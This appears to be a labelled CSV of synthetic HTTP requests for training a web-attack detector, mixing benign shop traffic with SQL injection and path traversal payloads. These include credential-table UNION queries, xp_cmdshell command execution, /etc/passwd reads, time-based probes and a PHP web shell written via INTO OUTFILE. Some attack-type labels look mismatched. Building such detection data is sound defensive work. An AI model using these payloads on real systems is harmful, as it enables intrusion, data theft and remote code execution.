timestamp,source_ip,method,url,params,body,headers,raw_query,is_malicious,attack_type,insertion_point,mutation_type,orig_payload_id,difficulty_score,source_file,Query,Label,Attack_Type,query_hash
2025-04-04T07:02:35Z,10.167.XXX.XXX,GET,/product,"{""id"": ""26"", ""ref"": ""lamp 2025""}",,,GET /product?id=26&ref=lamp 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,00cf1c746a4798f2b3f5e4f085e6a535
2025-04-07T02:18:54Z,192.168.XXX.XXX,GET,/search,"{""q"": ""'+AND+1=(SELECT+1+FROM+pg_sleep(5))--""}",,,GET /search?q='+AND+1=(SELECT+1+FROM+pg_sleep(5))-- HTTP/1.1,1.0,time-based,query_param,case_obf,p0086,0.5,dataset.csv,,,,a645b58d2e1da69c786c2a18a5ccae6d
2025-06-10T10:06:25Z,10.117.XXX.XXX,POST,/comment,,username=scooter&comment=table,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=scooter&comment=table",0.0,,,,,0.0,dataset.csv,,,,3b2a4be5277745d53c7255dd072e1409
2025-04-09T09:49:06Z,10.88.XXX.XXX,GET,/search,"{""q"": ""%31%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%64%61%74%61%62%61%73%65%28%29%2c%75%73%65%72%28%29%2c%76%65%72%73%69%6f%6e%28%29%2d%2d""}",,,GET /search?q=%31%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%64%61%74%61%62%61%73%65%28%29%2c%75%73%65%72%28%29%2c%76%65%72%73%69%6f%6e%28%29%2d%2d HTTP/1.1,1.0,union,query_param,comment_insert,p0048,0.8,dataset.csv,,,,c6a1235f97e3dec6201cc097b2249942
2025-05-02T14:50:26Z,10.99.XXX.XXX,GET,/search,"{""q"": ""%31%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%64%61%74%61%62%61%73%65%28%29%2c%75%73%65%72%28%29%2c%76%65%72%73%69%6f%6e%28%29%2d%2d""}",,,GET /search?q=%31%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%64%61%74%61%62%61%73%65%28%29%2c%75%73%65%72%28%29%2c%76%65%72%73%69%6f%6e%28%29%2d%2d HTTP/1.1,1.0,union,query_param,url_encode,p0048,0.6000000000000001,dataset.csv,,,,c6a1235f97e3dec6201cc097b2249942
2025-02-26T15:34:34Z,10.37.XXX.XXX,POST,/comment,,username=%27%3B%2F%2A%2A%2FEXEC%2F%2A%2A%2Fmaster..xp_cmdshell%2F%2A%2A%2F%27whoami%27%23%2500&comment=Phone,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=%27%3B%2F%2A%2A%2FEXEC%2F%2A%2A%2Fmaster..xp_cmdshell%2F%2A%2A%2F%27whoami%27%23%2500&comment=Phone",1.0,stacked,body_form,whitespace_obf,p0093,0.7000000000000001,dataset.csv,,,,8e55de90b191f971df28300fecdfc042
2025-02-13T15:12:08Z,10.111.XXX.XXX,POST,/comment,,username=84&comment=21,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=84&comment=21",0.0,,,,,0.0,dataset.csv,,,,956ab07651d4775dea7a07cf5cb602cc
2025-05-05T19:20:29Z,10.147.XXX.XXX,POST,/api/search,,"{{""user"":""music 2025"",""query"":""'/**/OR/**/a=a#""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""music 2025"",""query"":""'/**/OR/**/a=a#""}}",1.0,boolean,body_json,base64,p0144,1.0,dataset.csv,,,,8695c9084d552625f26ca90c54dcd835
2025-07-20T13:16:52Z,10.13.XXX.XXX,POST,/api/search,,"{{""user"":""john_doe"",""query"":""Music""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""john_doe"",""query"":""Music""}}",0.0,,,,,0.0,dataset.csv,,,,04dd0a36e5b5c669ca608b7e6509d6b9
2025-07-24T03:05:28Z,10.21.XXX.XXX,POST,/comment,,username=best react documentation&comment=Bike,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=best react documentation&comment=Bike",0.0,,,,,0.0,dataset.csv,,,,e963881ed574db7aa2445ac7f489b9ce
2025-06-01T17:54:16Z,10.80.XXX.XXX,POST,/comment,,username=best sofa&comment=react documentation 2025,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=best sofa&comment=react documentation 2025",0.0,,,,,0.0,dataset.csv,,,,8ca516f43c765aac298ffb3673ee2094
2025-01-18T17:55:35Z,10.208.XXX.XXX,GET,/profile,,,"{""Cookie"": ""session=5ec1482c0964761c53de112b22ac4d5d; prefs=lang=en""}","GET /profile HTTP/1.1
Cookie: session=5ec1482c0964761c53de112b22ac4d5d; prefs=lang=en",0.0,,,,,0.0,dataset.csv,,,,da3f25153f9fa61c253f3dd73e701ff5
2025-03-30T04:08:04Z,10.18.XXX.XXX,GET,/product,"{""id"": ""Scooter"", ""ref"": ""((';/**/EXEC/**/master..xp_cmdshell/**/'whoami'--))""}",,,GET /product?id=Scooter&ref=((';/**/EXEC/**/master..xp_cmdshell/**/'whoami'--)) HTTP/1.1,1.0,stacked,query_param,base64,p0152,1.0,dataset.csv,,,,8426b7f6ab703e7ad2c2e34393a71c34
2025-02-04T08:36:12Z,10.70.XXX.XXX,GET,/profile,,,"{""Cookie"": ""session=3d2b82187faba4e443b4e65bd20e10ec; prefs=lang=en""}","GET /profile HTTP/1.1
Cookie: session=3d2b82187faba4e443b4e65bd20e10ec; prefs=lang=en",0.0,,,,,0.0,dataset.csv,,,,1f9d99d9bc6cc3a371c1dfabece9061b
2025-05-01T18:16:32Z,10.217.XXX.XXX,POST,/comment,,username=game review&comment=shelf 2025,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=game review&comment=shelf 2025",0.0,,,,,0.0,dataset.csv,,,,2671d81d0188c410d29cbccdcc327808
2025-01-23T10:03:05Z,10.78.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""clothing"",""min_price"":362}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""clothing"",""min_price"":362}}}}",0.0,,,,,0.0,dataset.csv,,,,cd518b2a4cdf55ac166b7b56dfc5532c
2025-09-21T07:50:19Z,10.170.XXX.XXX,GET,/item,"{""id"": ""127.0.0.1'\nOR\n'1'='1""}",,,"GET /item?id=127.0.0.1'
OR
'1'='1 HTTP/1.1",1.0,header-injection,query_param,comment_insert,p0108,0.6,dataset.csv,,,,d04b5ba70711c4d3fecf293ed9a64f1a
2025-04-06T14:33:51Z,10.219.XXX.XXX,GET,/product,"{""id"": ""39"", ""ref"": ""Table""}",,,GET /product?id=39&ref=Table HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,ff07116644b43d6d42e723d9d3b3253a
2025-01-17T19:50:46Z,10.11.XXX.XXX,POST,/comment,,username=car price&comment=%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL--%2500,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=car price&comment=%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL--%2500",1.0,union,body_form,base64,p0179,1.0,dataset.csv,,,,6651136b66bdd52590f040e3e98007b9
2025-03-29T16:20:25Z,10.236.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""electronics"",""min_price"":922}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""electronics"",""min_price"":922}}}}",0.0,,,,,0.0,dataset.csv,,,,2f2cddf8f25622e414b3a852ef768be4
2025-08-02T02:03:41Z,10.227.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""books"",""min_price"":788}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""books"",""min_price"":788}}}}",0.0,,,,,0.0,dataset.csv,,,,3d6355977cec8defa116ae3512d8dafe
2025-09-27T18:56:17Z,10.3.XXX.XXX,GET,/product,"{""id"": ""game"", ""ref"": ""best bed""}",,,GET /product?id=game&ref=best bed HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,21ce535fd5f55f01dcac444eb3c32364
2025-09-30T06:00:41Z,10.78.XXX.XXX,GET,/product,"{""id"": ""jacket"", ""ref"": ""best python tutorial""}",,,GET /product?id=jacket&ref=best python tutorial HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,8ccce1e723fdd829c897ef1fff88c053
2025-10-14T15:54:01Z,10.23.XXX.XXX,POST,/comment,,username=travel destinations price&comment=10,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=travel destinations price&comment=10",0.0,,,,,0.0,dataset.csv,,,,3df64690b7e9eddf3e34f45ba8fef2a8
2025-09-09T09:40:07Z,10.147.XXX.XXX,POST,/api/search,,"{{""user"":""jacket"",""query"":""%27%20Or%20%27a%27%3D%27a""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""jacket"",""query"":""%27%20Or%20%27a%27%3D%27a""}}",1.0,boolean,body_json,whitespace_obf,p0170,0.7,dataset.csv,,,,4fd143a46b89b6edaaa537a79810e31e
2025-09-12T14:40:40Z,10.241.XXX.XXX,POST,/api/search,,"{{""user"":""best book"",""query"":""TABLE""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""best book"",""query"":""TABLE""}}",0.0,,,,,0.0,dataset.csv,,,,a23e517b9c8f5bff2ce26f070f0c8f14
2025-07-23T03:00:09Z,10.194.XXX.XXX,GET,/item,"{""id"": ""1 (' Or 'x'='x)""}",,,GET /item?id=1 (' Or 'x'='x) HTTP/1.1,1.0,boolean,query_param,none,p0177,0.2,dataset.csv,,,,f2530bee2c779e9451cd1273d4fa50ac
2025-09-22T12:21:58Z,192.168.XXX.XXX,POST,/comment,,username=battery&comment=%27+AND+LENGTH%28database%28%29%29%3E5%23%2500,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=battery&comment=%27+AND+LENGTH%28database%28%29%29%3E5%23%2500",1.0,blind,body_form,none,p0101,0.3,dataset.csv,,,,3ffc4a448c1c95583178ab7fa82d9629
2025-10-09T21:16:48Z,192.168.XXX.XXX,GET,/item,"{""id"": ""(1'%20AND%20SLEEP(5)#)""}",,,GET /item?id=(1'%20AND%20SLEEP(5)#) HTTP/1.1,1.0,time-based,query_param,comment_insert,p0130,0.6,dataset.csv,,,,446f5c3b1ed7d4647aa9b532d2c58d92
2025-06-13T13:39:42Z,10.194.XXX.XXX,GET,/product,"{""id"": ""61"", ""ref"": ""phone""}",,,GET /product?id=61&ref=phone HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,71a6c105c575a09711e9192884a614b1
2025-05-18T09:54:49Z,10.117.XXX.XXX,GET,/product,"{""id"": ""Scooter"", ""ref"": ""17""}",,,GET /product?id=Scooter&ref=17 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,8d49315e49f5af7e855e4730d2b9434b
2025-10-24T11:28:35Z,10.10.XXX.XXX,POST,/comment,,username=flight tickets 2025&comment=%252e%252e%253b%252f%252e%252e%253b%252f%252e%252e%253b%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564%2500,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=flight tickets 2025&comment=%252e%252e%253b%252f%252e%252e%253b%252f%252e%252e%253b%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564%2500",1.0,path-injection,body_form,base64,p0169,1.0,dataset.csv,,,,ff3a0e267d853d1f4fa9adabf6154a93
2025-01-08T00:21:47Z,10.68.XXX.XXX,GET,/product,"{""id"": ""Helmet"", ""ref"": ""best web development""}",,,GET /product?id=Helmet&ref=best web development HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,8561a4ac145769e20a7cb2041e4bc70f
2025-03-22T09:09:37Z,10.113.XXX.XXX,POST,/api/search,,"{{""user"":""53"",""query"":""..;/..;/..;/etc/passwd%00""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""53"",""query"":""..;/..;/..;/etc/passwd%00""}}",1.0,path-injection,body_json,comment_insert,p0119,0.8,dataset.csv,,,,2a2cdba470633c9643ad801717dee4ec
2025-08-06T04:17:26Z,192.168.XXX.XXX,POST,/comment,,username=%27%09AND%09gtid_subset%28version%28%29%2C1%29--&comment=healthy recipes review,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=%27%09AND%09gtid_subset%28version%28%29%2C1%29--&comment=healthy recipes review",1.0,error,body_form,url_encode,p0165,0.5,dataset.csv,,,,67b932a29876e6c9011e8e8b87937a1e
2025-03-26T11:01:01Z,10.15.XXX.XXX,POST,/api/search,,"{{""user"":""best shelf"",""query"":""1'/**/AND/**/SLEEP(5)--%00%00""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""best shelf"",""query"":""1'/**/AND/**/SLEEP(5)--%00%00""}}",1.0,time-based,body_json,url_encode,p0071,0.6,dataset.csv,,,,8cdfc62b4e672bd96a610c91afd75fe3
2025-02-03T19:01:00Z,10.139.XXX.XXX,POST,/comment,,username=%28%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SeLeCt%2F%2A%2A%2F%2A%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SeLeCt%28SLEEP%285%29%29%29a%29%23%29%2500&comment=bed price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=%28%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SeLeCt%2F%2A%2A%2F%2A%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SeLeCt%28SLEEP%285%29%29%29a%29%23%29%2500&comment=bed price",1.0,time-based,body_form,comment_insert,p0166,0.7999999999999999,dataset.csv,,,,69bee734fbadd7621f5315a8d63e12e3
2025-05-21T04:15:34Z,10.242.XXX.XXX,POST,/comment,,username=Battery&comment=%2531%2527%2520%254f%2552%2520%2549%2546%2528%2531%253d%2531%252c%2553%254c%2545%2545%2550%2528%2535%2529%252c%2530%2529%252d%252d,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=Battery&comment=%2531%2527%2520%254f%2552%2520%2549%2546%2528%2531%253d%2531%252c%2553%254c%2545%2545%2550%2528%2535%2529%252c%2530%2529%252d%252d",1.0,time-based,body_form,double_encode,p0083,0.8,dataset.csv,,,,2e75dce99e28d65ddfce4452d4c7bda6
2025-09-02T12:59:47Z,10.14.XXX.XXX,POST,/comment,,username=100&comment=51,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=100&comment=51",0.0,,,,,0.0,dataset.csv,,,,51d641082333da4fc49f4e65de9ddb78
2025-06-28T10:56:35Z,10.71.XXX.XXX,GET,/search,"{""q"": ""JyBBTkQgZXhwKH4oU0VMRUNUICogRlJPTSAoU0VMRUNUIDEpYSkpLS0=""}",,,GET /search?q=JyBBTkQgZXhwKH4oU0VMRUNUICogRlJPTSAoU0VMRUNUIDEpYSkpLS0= HTTP/1.1,1.0,error,query_param,hex,p0059,1.0,dataset.csv,,,,eba70b17d26b0ba8094ec040a285fd58
2025-06-13T02:58:54Z,10.4.XXX.XXX,POST,/comment,,username=web development review&comment=hat review,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=web development review&comment=hat review",0.0,,,,,0.0,dataset.csv,,,,67d5c8c7099d4f5c05d0a2c620aa5ea5
2025-09-30T07:43:10Z,10.147.XXX.XXX,GET,/product,"{""id"": ""1';%20WAITFOr%20DELAY%20'0:0:5'--"", ""ref"": ""SOFA""}",,,GET /product?id=1';%20WAITFOr%20DELAY%20'0:0:5'--&ref=SOFA HTTP/1.1,1.0,time-based,query_param,double_encode,p0074,0.7,dataset.csv,,,,f3d8a3e70d8216f2e4f8bfec24284dcd
2025-05-09T11:43:54Z,10.170.XXX.XXX,POST,/comment,,username=HOTEL BOOKING&comment=LAPTOP,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=HOTEL BOOKING&comment=LAPTOP",0.0,,,,,0.0,dataset.csv,,,,84b26565991133cb56fe83a74b668e03
2025-06-23T08:35:06Z,10.89.XXX.XXX,POST,/comment,,username=bed 2025&comment=best bed,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=bed 2025&comment=best bed",0.0,,,,,0.0,dataset.csv,,,,28814e3ba9e3060cbc5d91b59a20320e
2025-09-25T09:22:47Z,192.168.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""'/**/UNION/**/SELECT/**/*/**/FROM/**/(SELECT/**/NULL,NULL,NULL)a--"",""min_price"":233}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""'/**/UNION/**/SELECT/**/*/**/FROM/**/(SELECT/**/NULL,NULL,NULL)a--"",""min_price"":233}}}}",1.0,union,body_json,none,p0141,0.5,dataset.csv,,,,05d6ab4fb86f908c053354ade96a0750
2025-06-07T11:38:30Z,10.152.XXX.XXX,POST,/api/search,,"{{""user"":""machine learning price"",""query"":""frank""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""machine learning price"",""query"":""frank""}}",0.0,,,,,0.0,dataset.csv,,,,9f2ee8df3e2382b272877d4f16e6dc9d
2025-04-15T00:45:42Z,10.37.XXX.XXX,POST,/api/search,,"{{""user"":""73"",""query"":""Bed""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""73"",""query"":""Bed""}}",0.0,,,,,0.0,dataset.csv,,,,7a0833bf125e627ab0a330ea4f0e99f3
2025-01-13T09:26:21Z,10.70.XXX.XXX,POST,/comment,,username=best shoes&comment=%27+OR+BENCHMARK%285000000%2CMD5%28%27A%27%29%29%23+AND+1%3D1,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=best shoes&comment=%27+OR+BENCHMARK%285000000%2CMD5%28%27A%27%29%29%23+AND+1%3D1",1.0,time-based,body_form,none,p0197,0.3,dataset.csv,,,,2bf4af5a1f313880b1be6773c485bb20
2025-07-03T21:04:41Z,10.22.XXX.XXX,GET,/search,"{""q"": ""'%20UnIoN%20SELECT%201,'<?php%20system($_GET[\""cmd\""]);%20?>',3%20INTO%20OUTFILE%20'/var/www/shell.php'#""}",,,"GET /search?q='%20UnIoN%20SELECT%201,'<?php%20system($_GET[""cmd""]);%20?>',3%20INTO%20OUTFILE%20'/var/www/shell.php'# HTTP/1.1",1.0,union,query_param,comment_insert,p0052,0.8,dataset.csv,,,,5f12a103b9c6347c2123d8d5d451f454
2025-09-30T14:24:01Z,10.4.XXX.XXX,GET,/product,"{""id"": ""hotel booking"", ""ref"": ""6""}",,,GET /product?id=hotel booking&ref=6 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,2a57bc77d229359e5a1eea4b1f188b14
2025-05-11T09:11:23Z,10.102.XXX.XXX,GET,/product,"{""id"": ""1"", ""ref"": ""laptop""}",,,GET /product?id=1&ref=laptop HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,a4c510c60fb00b5cbbb3bb252147caa8
2025-03-01T15:42:52Z,10.116.XXX.XXX,GET,/search,"{""q"": ""'%20UNION%20SeLeCt%20NULL--""}",,,GET /search?q='%20UNION%20SeLeCt%20NULL-- HTTP/1.1,1.0,union,query_param,case_obf,p0035,0.5,dataset.csv,,,,93e9465e27be118774c9245a370740dd
2025-03-19T14:56:25Z,10.0.XXX.XXX,POST,/api/search,,"{{""user"":""best pants"",""query"":""'+UNION+SELECT+NULL,NULL,load_file('/etc/passwd')--%00""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""best pants"",""query"":""'+UNION+SELECT+NULL,NULL,load_file('/etc/passwd')--%00""}}",1.0,union,body_json,none,p0050,0.4,dataset.csv,,,,142c013568b374c244f65d944f867cf0
2025-03-27T04:48:49Z,10.30.XXX.XXX,GET,/item,"{""id"": ""1 ' UNION SELECT column_name,NULL FROM information_schema.columns-- AND 1=1%00""}",,,"GET /item?id=1 ' UNION SELECT column_name,NULL FROM information_schema.columns-- AND 1=1%00 HTTP/1.1",1.0,union,query_param,url_encode,p0120,0.4,dataset.csv,,,,e0579efb9542764e80bae6acafebcb64
2025-10-16T21:59:26Z,10.197.XXX.XXX,GET,/item/4858/details,,,,GET /item/4858/details HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,bbac85b4bbb2505294bbd9a32c3d5b41
2025-02-14T05:13:33Z,10.210.XXX.XXX,GET,/product,"{""id"": ""helmet"", ""ref"": ""laptop price""}",,,GET /product?id=helmet&ref=laptop price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,630578b5e448877afee454c61ef1415a
2025-02-15T17:40:59Z,10.234.XXX.XXX,GET,/item,"{""id"": ""1'/**/Or/**/BENCHMARK(5000000,MD5('A'))#%00%00""}",,,"GET /item?id=1'/**/Or/**/BENCHMARK(5000000,MD5('A'))#%00%00 HTTP/1.1",1.0,time-based,query_param,double_encode,p0076,0.7,dataset.csv,,,,26bd073caedb77265b365ed3f4ba3b33
2025-07-26T11:23:19Z,10.60.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--"",""min_price"":662}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--"",""min_price"":662}}}}",1.0,time-based,body_json,none,p0084,0.4,dataset.csv,,,,edfbe226fa05c3449da7d4afa519b7d9
2025-05-09T13:17:47Z,10.7.XXX.XXX,POST,/comment,,username=sofa review&comment=%27+AND+gtid_subset%28version%28%29%2C1%29%23%2500,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=sofa review&comment=%27+AND+gtid_subset%28version%28%29%2C1%29%23%2500",1.0,error,body_form,none,p0127,0.3,dataset.csv,,,,c3c5ec07bc7b5219126b877093a5a889
2025-06-28T19:21:38Z,10.25.XXX.XXX,POST,/api/search,,"{{""user"":""python tutorial"",""query"":""'/**/OR/**/1=1/**/AND/**/''='%00""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""python tutorial"",""query"":""'/**/OR/**/1=1/**/AND/**/''='%00""}}",1.0,boolean,body_json,none,p0032,0.5,dataset.csv,,,,3f0f3ac97e47d55a3a23170db59c7b5c
2025-01-29T11:19:57Z,10.34.XXX.XXX,GET,/product,"{""id"": ""car 2025"", ""ref"": ""camera review""}",,,GET /product?id=car 2025&ref=camera review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,c25ad20ca385228c891a6167ecf6721b
2025-07-09T05:14:10Z,192.168.XXX.XXX,POST,/comment,,username=camera review&comment=%28%27%2BOR%2B%271%27%3D%271%27%2BAND%2B%27%27%3D%27%29,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=camera review&comment=%28%27%2BOR%2B%271%27%3D%271%27%2BAND%2B%27%27%3D%27%29",1.0,boolean,body_form,whitespace_obf,p0153,0.6000000000000001,dataset.csv,,,,1219c67cb495154dfb97583776bf88dd
2025-09-12T05:15:13Z,10.12.XXX.XXX,POST,/comment,,username=67&comment=bed price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=67&comment=bed price",0.0,,,,,0.0,dataset.csv,,,,91ca7609c4f9c78a4eced2d0d8ff6bd2
2025-06-30T11:29:36Z,10.91.XXX.XXX,GET,/search,"{""q"": ""%27%20%4f%52%20%31%2d%2d%00""}",,,GET /search?q=%27%20%4f%52%20%31%2d%2d%00 HTTP/1.1,1.0,boolean,query_param,url_encode,p0163,0.4,dataset.csv,,,,97cbceb999c634cf812f9825ebfb938b
2025-04-07T16:24:36Z,10.197.XXX.XXX,POST,/comment,,username=24&comment=best table,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=24&comment=best table",0.0,,,,,0.0,dataset.csv,,,,8a346ab026017ef636b34be664c16dce
2025-08-15T20:51:02Z,10.132.XXX.XXX,POST,/api/search,,"{{""user"":""shelf review"",""query"":""1'/**/Or/**/'1' LIKE '1""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""shelf review"",""query"":""1'/**/Or/**/'1' LIKE '1""}}",1.0,path-injection,body_json,none,p0128,0.4,dataset.csv,,,,fd0a3e37e8517d2544e51536debf5c50
2025-03-05T22:14:33Z,10.199.XXX.XXX,GET,/search,"{""q"": ""' UnIoN SELECT username,password FROM users#%00""}",,,"GET /search?q=' UnIoN SELECT username,password FROM users#%00 HTTP/1.1",1.0,union,query_param,none,p0044,0.2,dataset.csv,,,,fa71737b7da038a8e2bf8a20184bf267
2025-09-09T07:57:10Z,10.227.XXX.XXX,GET,/product,"{""id"": ""8"", ""ref"": ""helmet price""}",,,GET /product?id=8&ref=helmet price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,2c4c05d4e892504fa0108681ab122bbf
2025-08-18T15:09:49Z,10.226.XXX.XXX,GET,/product,"{""id"": ""desk review"", ""ref"": ""bike price""}",,,GET /product?id=desk review&ref=bike price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,b718a41a66e48879260bf881bb9efc43
2025-10-24T14:31:36Z,10.253.XXX.XXX,GET,/product,"{""id"": ""Laptop"", ""ref"": ""Battery""}",,,GET /product?id=Laptop&ref=Battery HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,39ff7514d77e5f60627c7141a10378fa
2025-01-03T02:40:25Z,10.156.XXX.XXX,POST,/api/search,,"{{""user"":""CAR"",""query"":""JTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmZXRjJTJmcGFzc3dk""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""CAR"",""query"":""JTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmZXRjJTJmcGFzc3dk""}}",1.0,path-injection,body_json,comment_insert,p0117,0.8,dataset.csv,,,,e637c69a12a332ee5fd26e8a0a2c7e24
